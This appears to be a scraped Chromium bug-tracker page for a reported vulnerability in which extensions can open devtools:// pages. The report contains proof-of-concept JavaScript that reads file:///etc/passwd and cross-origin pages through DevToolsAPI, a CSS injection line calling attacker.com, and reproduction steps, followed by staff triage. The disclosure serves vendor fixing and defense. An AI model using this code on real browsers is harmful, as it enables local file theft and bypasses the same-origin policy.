 function _go(url, newWindow) {
 if (newWindow)
 window.open(url, '_blank');
 else
 document.location = url;
 }
 function $(id) { return document.getElementById(id); }
 var loadQueue = [];
 function runOnLoad(fn) { loadQueue.push(fn); }
 window.onload = function() {
 for (var i = 0; i < loadQueue.length; i++)
 loadQueue[i]();
 delete loadQueue;
 };

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {

    max-width: 100%;

    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }

      text-align: left;

          </button>
        <h2>
          Issue tracker keyboard shortcuts
          <button class="close-button">
            Close
          </button>
        </h2>
        
          
            
              <span></span>Issue list<span class="help-title"><!---->Issue list<!----></span>
              
                
                  
                    k<kbd><!---->k<!----></kbd>
                     / <span class="key-separator"> / </span>
                  
                    j<kbd><!---->j<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->k<!----></kbd>
                    <span class="key-separator"> / </span>
                  <!---->
                    <kbd><!---->j<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                up/down in the list<span class="key-tip"><!---->up/down in the list<!----></span>
              
                
                  
                    o<kbd><!---->o<!----></kbd>
                     / <span class="key-separator"> / </span>
                  
                    Enter<kbd><!---->Enter<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->o<!----></kbd>
                    <span class="key-separator"> / </span>
                  <!---->
                    <kbd><!---->Enter<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                open the current issue<span class="key-tip"><!---->open the current issue<!----></span>

        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>
      
      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

        <div class="dialog-content">
          <slot></slot>
        </div>

        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>

          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

            Issue 1049265: Extensions with no special privileges are allowed to navigate to devtools:// scheme pages.
          <h1>
            
            Issue 1049265: Extensions with no special privileges are allowed to navigate to devtools:// scheme pages.
          </h1>

      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

      VULNERABILITY DETAILS<b class="line"><!---->VULNERABILITY DETAILS<!----></b><br>It is possible to use the "ws" and "wss" parameters on the devtools://devtools/bundled/inspector.html endpoint to force it to connect to a malicious remote Chrome instance.<span class="line"><!---->It is possible to use the "ws" and "wss" parameters on the devtools://devtools/bundled/inspector.html endpoint to force it to connect to a malicious remote Chrome instance.<!----></span><br><br>Afterwards, the Chrome instance can execute:<span class="line"><!---->Afterwards, the Chrome instance can execute:<!----></span><br>console.log("%c", "background:url(<span class="line"><!---->console.log("%c", "background:url(<!----></span>https://attacker.com/img.png)");<a class="undefined" target="_blank" href="https://attacker.com/img.png)&quot;);"><!---->https://attacker.com/img.png)");<!----></a><br><br>Which will be reflected inside the privileged devtools:// page and execute the CSS. The image will also be rendered inside the page.<span class="line"><!---->Which will be reflected inside the privileged devtools:// page and execute the CSS. The image will also be rendered inside the page.<!----></span><br><br>This can lead to the privileged process being compromised by a bug in the CSS parser / image parser.<span class="line"><!---->This can lead to the privileged process being compromised by a bug in the CSS parser / image parser.<!----></span><br><br>Once the renderer process is compromised, the attacker would be able to run arbitrary javascript and read local files / cross-origin pages by leveraging the DevToolsAPI.<span class="line"><!---->Once the renderer process is compromised, the attacker would be able to run arbitrary javascript and read local files / cross-origin pages by leveraging the DevToolsAPI.<!----></span><br><br>// Reading local files<span class="line"><!---->// Reading local files<!----></span><br>var data = "";<span class="line"><!---->var data = "";<!----></span><br><br>DevToolsAPI.streamWrite = function(id, chunk) {<span class="line"><!---->DevToolsAPI.streamWrite = function(id, chunk) {<!----></span><br>    data += chunk;<span class="line"><!---->    data += chunk;<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>DevToolsAPI.sendMessageToEmbedder(<span class="line"><!---->DevToolsAPI.sendMessageToEmbedder(<!----></span><br>    "loadNetworkResource",<span class="line"><!---->    "loadNetworkResource",<!----></span><br>    [ "file:///etc/passwd", "", 0 ],<span class="line"><!---->    [ "file:///etc/passwd", "", 0 ],<!----></span><br>    function (result) {<span class="line"><!---->    function (result) {<!----></span><br>        console.log(data);    <span class="line"><!---->        console.log(data);    <!----></span><br>    }<span class="line"><!---->    }<!----></span><br>);<span class="line"><!---->);<!----></span><br><br>// Reading cross-origin page<span class="line"><!---->// Reading cross-origin page<!----></span><br>var data = "";<span class="line"><!---->var data = "";<!----></span><br><br>DevToolsAPI.streamWrite = function(id, chunk) {<span class="line"><!---->DevToolsAPI.streamWrite = function(id, chunk) {<!----></span><br>    data += chunk;<span class="line"><!---->    data += chunk;<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>DevToolsAPI.sendMessageToEmbedder(<span class="line"><!---->DevToolsAPI.sendMessageToEmbedder(<!----></span><br>    "loadNetworkResource",<span class="line"><!---->    "loadNetworkResource",<!----></span><br>    [ "<span class="line"><!---->    [ "<!----></span>https://www.google.com/<a class="undefined" target="_blank" href="https://www.google.com/"><!---->https://www.google.com/<!----></a>",<span class="line"><!---->",<!----></span> "", 0 ],<span class="line"><!----> "", 0 ],<!----></span><br>    function (result) {<span class="line"><!---->    function (result) {<!----></span><br>        console.log(data);<span class="line"><!---->        console.log(data);<!----></span><br>    }<span class="line"><!---->    }<!----></span><br>);<span class="line"><!---->);<!----></span><br><br>Besides the ability to compromise the renderer, the attacker needs to have control over an extension without any privilege that is installed in the victim's browser since the devtools:// page can't normally be launched from the web.<span class="line"><!---->Besides the ability to compromise the renderer, the attacker needs to have control over an extension without any privilege that is installed in the victim's browser since the devtools:// page can't normally be launched from the web.<!----></span><br><br>I have also uploaded an unlisted video demonstrating the issue:<span class="line"><!---->I have also uploaded an unlisted video demonstrating the issue:<!----></span><br>https://www.youtube.com/watch?v=ocwp40yZiM4<a class="undefined" target="_blank" href="https://www.youtube.com/watch?v=ocwp40yZiM4"><!---->https://www.youtube.com/watch?v=ocwp40yZiM4<!----></a><br><br>VERSION<b class="line"><!---->VERSION<!----></b><br>Version 80.0.3987.87 (Official Build) (64-bit)<span class="line"><!---->Version 80.0.3987.87 (Official Build) (64-bit)<!----></span><br><br>REPRODUCTION CASE<b class="line"><!---->REPRODUCTION CASE<!----></b><br>1. Run ./chrome --remote-debugging-port=9222 to simulate the attacker's browser instance.<span class="line"><!---->1. Run ./chrome --remote-debugging-port=9222 to simulate the attacker's browser instance.<!----></span><br>2. Open <span class="line"><!---->2. Open <!----></span>http://localhost:9222/json/new?https://lbherrera.github.io/lab/chrome/devtools/index.html<a class="undefined" target="_blank" href="http://localhost:9222/json/new?https://lbherrera.github.io/lab/chrome/devtools/index.html"><!---->http://localhost:9222/json/new?https://lbherrera.github.io/lab/chrome/devtools/index.html<!----></a><br>3. Copy the ID of the page.<span class="line"><!---->3. Copy the ID of the page.<!----></span><br>4. Download and unzip the extension.<span class="line"><!---->4. Download and unzip the extension.<!----></span><br>5. Change the pageID variable in the "script.js" file to the ID you just retrieved.<span class="line"><!---->5. Change the pageID variable in the "script.js" file to the ID you just retrieved.<!----></span><br>6. Install the extension on your browser.<span class="line"><!---->6. Install the extension on your browser.<!----></span><br>7. A new window should open automatically displaying an image rendered inside the devtools:// page.<span class="line"><!---->7. A new window should open automatically displaying an image rendered inside the devtools:// page.<!----></span><br><br>CREDIT INFORMATION<b class="line"><!---->CREDIT INFORMATION<!----></b><br>Reporter credit: Luan Herrera (@lbherrera_)<span class="line"><!---->Reporter credit: Luan Herrera (@lbherrera_)<!----></span><mr-comment-content></mr-comment-content>

          <a class="comment-link" href="?id=1049265#c1">Comment 1<!----></a>

          
        by

        <div>
          <a class="comment-link" href="?id=1049265#c1">Comment 1<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Wed, Feb 5, 2020, 7:05 PM EST"></chops-timestamp>

          Status:<strong><!---->Status:</strong>
          
          WontFix
          (was: Unconfirmed)
          <br>
        
          Cc:<strong><!---->Cc:</strong>
          
          carlosil@chromium.org
          
          <br>
        
        
      <div class="issue-diff">
        <!---->
          <strong><!---->Status:</strong>
          
          WontFix
          (was: Unconfirmed)
          <br>
        <!---->
          <strong><!---->Cc:</strong>
          
          carlosil@chromium.org
          
          <br>
        <!---->
        
      </div><br>
    
        
      
        It's unclear to me what the issue is here. If a user opens up devtools and connects to a remote debugging endpoint, the endpoint will be able to interact with devtools, so that part is working as intended, there are some mitigations in Chrome, such as not being able to open devtools:// links from other sites.<span class="line"><!---->It's unclear to me what the issue is here. If a user opens up devtools and connects to a remote debugging endpoint, the endpoint will be able to interact with devtools, so that part is working as intended, there are some mitigations in Chrome, such as not being able to open devtools:// links from other sites.<!----></span><br><br>If you also have bugs that perform the "compromise the renderer by a bug in the CSS parser / image parser." those would be valid bugs, so please report them separately.<span class="line"><!---->If you also have bugs that perform the "compromise the renderer by a bug in the CSS parser / image parser." those would be valid bugs, so please report them separately.<!----></span><mr-comment-content></mr-comment-content>

        </div>

        <mr-user-link></mr-user-link>

        <chops-timestamp title="Wed, Feb 5, 2020, 7:23 PM EST"></chops-timestamp>

      <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1049265#c2">Comment 2<!----></a>

          
        by
        <mr-user-link></mr-user-link>

        <chops-timestamp title="Wed, Feb 5, 2020, 7:23 PM EST"></chops-timestamp>

      </div>
    
      
        
        
      
        This issue describes an escalation of privilege that could be achieved when an attacker can compromise the renderer through a bug in the CSS parser / image parser since attacker-controlled data is being rendered inside a privileged page.<span class="line"><!---->This issue describes an escalation of privilege that could be achieved when an attacker can compromise the renderer through a bug in the CSS parser / image parser since attacker-controlled data is being rendered inside a privileged page.<!----></span><br><br>It is my understanding that a compromised renderer shouldn't be able to read cross-origin pages nor local files under Chrome's current security model.<span class="line"><!---->It is my understanding that a compromised renderer shouldn't be able to read cross-origin pages nor local files under Chrome's current security model.<!----></span><br><br>As for the mitigation you talked about - in the report it is demonstrated that an extension without any permission can force the user to open devtools://<span class="line"><!---->As for the mitigation you talked about - in the report it is demonstrated that an extension without any permission can force the user to open devtools://<!----></span><mr-comment-content></mr-comment-content>

          Summary:<strong><!---->Summary:</strong>
          
          Extensions with no special privileges are allowed to navigate to devtools:// scheme pages.
          (was: Same-origin policy bypass / Site Isolation bypass / Local file read when compromising renderer on devtools://)
          <br>
        
          Status:<strong><!---->Status:</strong>
          
          Assigned
          (was: WontFix)
          <br>
        
          Owner:<strong><!---->Owner:</strong>
          
          lazyboy@chromium.org
          
          <br>
        
          Cc:<strong><!---->Cc:</strong>
          
          nparker@chromium.org
          
          <br>
        
          Labels:<strong><!---->Labels:</strong>

          <br>
        
          Components:<strong><!---->Components:</strong>
          
          Platform>DevTools Platform>Extensions
          
          <br>

          <strong><!---->Summary:</strong>

          <br>

        It seems the issue here is that extensions can navigate to devtools://, since we don't otherwise allow navigations to that scheme. Otherwise I still think the inspector loading content written to the port it is connected to is working as intended. I'll reopen the bug and update the description. Labeling with medium severity since this requires an extension to be installed.<span class="line"><!---->It seems the issue here is that extensions can navigate to devtools://, since we don't otherwise allow navigations to that scheme. Otherwise I still think the inspector loading content written to the port it is connected to is working as intended. I'll reopen the bug and update the description. Labeling with medium severity since this requires an extension to be installed.<!----></span><br><br>lazyboy: Can you further triage?<span class="line"><!---->lazyboy: Can you further triage?<!----></span><mr-comment-content></mr-comment-content>

        We do allow extensions to navigate to more pages than on the web (e.g., chrome:-scheme pages), and this is important for some use cases.  I wonder if devtools is necessary, though.  I don't see a real compelling use case, but I could imagine some extensions allowing one-click debug or similar and opening up the inspector to a given page.<span class="line"><!---->We do allow extensions to navigate to more pages than on the web (e.g., chrome:-scheme pages), and this is important for some use cases.  I wonder if devtools is necessary, though.  I don't see a real compelling use case, but I could imagine some extensions allowing one-click debug or similar and opening up the inspector to a given page.<!----></span><br><br>The first step here is probably gathering some UMA to see whether or not we could just disallow devtools:// navigations.  Tim, do you think you could take this on?<span class="line"><!---->The first step here is probably gathering some UMA to see whether or not we could just disallow devtools:// navigations.  Tim, do you think you could take this on?<!----></span><mr-comment-content></mr-comment-content>

        Extensions can use the Chrome DevTools protocol directly. I don't think opening DevTools UI is documented or has much value. I think it's rather dangerous.<span class="line"><!---->Extensions can use the Chrome DevTools protocol directly. I don't think opening DevTools UI is documented or has much value. I think it's rather dangerous.<!----></span><br><br>We've had numerous user reports of DevTools annoyingly opening without their consent. We were wondering whether this was caused by extensions.<span class="line"><!---->We've had numerous user reports of DevTools annoyingly opening without their consent. We were wondering whether this was caused by extensions.<!----></span><br><br>Let's disable this and wait for feedback?<span class="line"><!---->Let's disable this and wait for feedback?<!----></span><mr-comment-content></mr-comment-content>

        by

        Checking in on this metric a few weeks on, there seem to be literally 0 logged API navigations to devtools scheme URLs. I had to double check that we were actually logging them correctly by triggering one locally and it does update the local chrome://histograms count.<span class="line"><!---->Checking in on this metric a few weeks on, there seem to be literally 0 logged API navigations to devtools scheme URLs. I had to double check that we were actually logging them correctly by triggering one locally and it does update the local chrome://histograms count.<!----></span><br><br>Do we want to gather more data from stable, or are we good to just block these and pass back an error at this point?<span class="line"><!---->Do we want to gather more data from stable, or are we good to just block these and pass back an error at this point?<!----></span><mr-comment-content></mr-comment-content>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

       Note: Avoiding 2-way data binding to futureproof this code
        for LitElement. 
      <input id="checkbox" type="checkbox">
      
        <slot></slot>
      <label for="checkbox">
        <slot></slot>
      </label>
    Send email<chops-checkbox id="sendEmail">Send email</chops-checkbox>

      <button>

      </button>

            </chops-button>

      </button>

        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }

          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;

    <mr-app loginurl="https://accounts.google.com/AccountChooser?continue=https%3A%2F%2Fuc.appengine.google.com%2F_ah%2Fconflogin%3Fcontinue%3Dhttps%253A%252F%252Fbugs.chromium.org%252Fp%252Fchromium%252Fissues%252Fdetail%253Fid%253D1049265%2526q%253Dlabel%25253Aexternal_security_report%2526can%253D1%2526start%253D5400" logouturl="https://bugs.chromium.org/_ah/logout?continue=https://accounts.google.com/Logout%3Fcontinue%3Dhttps://uc.appengine.google.com/_ah/logout%253Fcontinue%253Dhttps://www.google.com/url%25253Fsa%25253DD%252526q%25253Dhttps://bugs.chromium.org/p/chromium/issues/detail%2525253Fid%2525253D1049265%25252526q%2525253Dlabel%252525253Aexternal_security_report%25252526can%2525253D1%25252526start%2525253D5400%252526ust%25253D1703414829641828%252526usg%25253DAOvVaw3V9vwvbzhlUtppQygBef8f%26service%3Dah" versionbase="https://61906-5c6a57f-dot-monorail-prod.appspot.com" projectalert=""><!---->
      <style>
        
  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
